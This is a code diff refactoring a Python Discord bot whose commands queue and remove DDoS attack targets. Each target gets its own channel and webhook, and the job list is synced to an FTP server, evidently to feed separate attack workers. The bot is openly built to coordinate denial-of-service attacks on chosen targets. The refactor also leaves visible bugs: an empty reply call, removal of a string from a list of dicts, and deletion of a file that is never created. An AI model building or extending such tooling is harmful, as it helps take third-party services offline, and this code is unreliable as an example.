@@ -2,36 +2,20 @@
 # ALL RIGHTS RESERVED
 #
 
+import io
 import discord
-import requests
-import threading
-import time
-import random
-import string
 import os
-import sys
-import ctypes
-import colorama
 import json
 import ftplib
-from ftplib import FTP
-from colorama import init
-import config
-init(autoreset=True)
-
-
-from colorama import Fore, Back, Style
-from discord.ext import commands
-from discord.ext.commands import Bot
-from discord.ext.commands import has_permissions, MissingPermissions
-from discord.ext.commands import CommandNotFound
-from discord.ext.commands import CommandOnCooldown
+import dotenv
+dotenv.load_dotenv()
+from discord.ext.commands import Bot, Context
 
 #connect bot with all intents
 
 
 #get jobs from ftp server and save variable jobs
-ftp = FTP('ftp.example.com', 'username', 'password')
+ftp = ftplib.FTP('ftp.example.com', 'username', 'password')
 
 #check if file exists
 if "jobs.json" in ftp.nlst():
@@ -49,19 +33,15 @@ ftp.quit()
 
 def saveftp():
     #connect to ftp server
-    ftp = FTP(config.FTP["host"])
-    ftp.login(user=config.FTP["user"], passwd = config.FTP["password"])
+    ftp = ftplib.FTP(os.getenv("ftp_host"))
+    ftp.login(user=os.getenv("ftp_user"), passwd = os.getenv("ftp_password"))
 
     #if file exists, delete it
     if "jobs.json" in ftp.nlst():
         ftp.delete("jobs.json")
 
-    #create file and save jobs variable
-    with open('jobs.json', 'w') as f:
-        json.dump(jobs, f)
-
     #upload file
-    ftp.storbinary('STOR jobs.json', open('jobs.json', 'rb'))
+    ftp.storbinary('STOR jobs.json', io.BytesIO(json.dumps(jobs).encode('utf8')))
 
     #end delete file
     os.remove("jobs.json")
@@ -70,8 +50,7 @@ def saveftp():
     ftp.quit()
 ###############################################################################################
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix='!', intents=intents)
-bot.run(config.DISCORD_TOKEN)
+bot = Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
@@ -79,55 +58,41 @@ async def on_ready():
     print(bot.user.name)
     print(bot.user.id)
     print('------')
-
-@bot.event
-async def on_message(message):
-    suri = "false"
-
-    args = message.content.split(" ").slice(1)
-
-    if message.content.startswith('!create_ddos_attack'):
-        if not args[0]:
-            await message.channel.send("Please specify a target. Usage: !create_ddos_attack <target>")
+@bot.command(name='create_ddos_attack', help='Creates a new DDOS attack. Usage: !create_ddos_attack <target>')
+async def create_ddos_attack(ctx : Context, target):
+    #check every value in jobs, if target not there then add it
+    for job in jobs:
+        if job["target"] == target:
+            await ctx.reply("Target already exists in the queue.")
             return
         
-        #check every value in jobs, if target not there then add it
-        for job in jobs:
-            if job["target"] == args[0]:
-                await message.channel.send("Target already exists in the queue.")
-                return
-        
-        #create new channel for attack of category "DDOS Attacks"
-        guild = bot.get_guild(config.GUILD_ID)
-        #if category doesn't exist, create it
-        if not discord.utils.get(guild.categories, name="DDOS Attacks"):
-            await guild.create_category("DDOS Attacks")
+    
+        if not discord.utils.get(ctx.guild.categories, name="DDOS Attacks"):
+            await ctx.guild.create_category("DDOS Attacks")
         #create channel
-        channel = await guild.create_text_channel(args[0], category=discord.utils.get(guild.categories, name="DDOS Attacks"))
+        channel = await ctx.guild.create_text_channel(target, category=discord.utils.get(ctx.guild.categories, name="DDOS Attacks"))
         #create webhook and get url
         webhook = await channel.create_webhook(name="DDOS Attack")
 
         #add target to jobs
         jobs.append({
-            "target": args[0],
+            "target": target,
             "webhook": webhook.url
         })
 
         saveftp()
 
-        await message.channel.send("Target added to the queue.")
+        await ctx.reply()
 
-    if message.content.startswith('!delete_ddos_attack'):
-        if not args[0]:
-            await message.channel.send("Please specify a target. Usage: !delete_ddos_attack <target>")
-            return
+@bot.command(name='delete_ddos_attack', help='Deletes a DDOS attack. Usage: !delete_ddos_attack <target>')
+async def delete_ddos_attack(ctx : Context, target):
+    #check every value in jobs, if target not there then add it
+    try:
+        jobs.remove(target)
+        saveftp()
+        return await ctx.reply("Target removed from the queue.")
+    except:
+        return await ctx.reply("Target not found in the queue.")
 
-        #check every value in jobs, if target not there then add it
-        for job in jobs:
-            if job["target"] == args[0]:
-                jobs.remove(job)
-                saveftp()
-                await message.channel.send("Target removed from the queue.")
-                return
-        
-        await message.channel.send("Target not found in the queue.")
+
+bot.run(os.getenv('discord_token'))
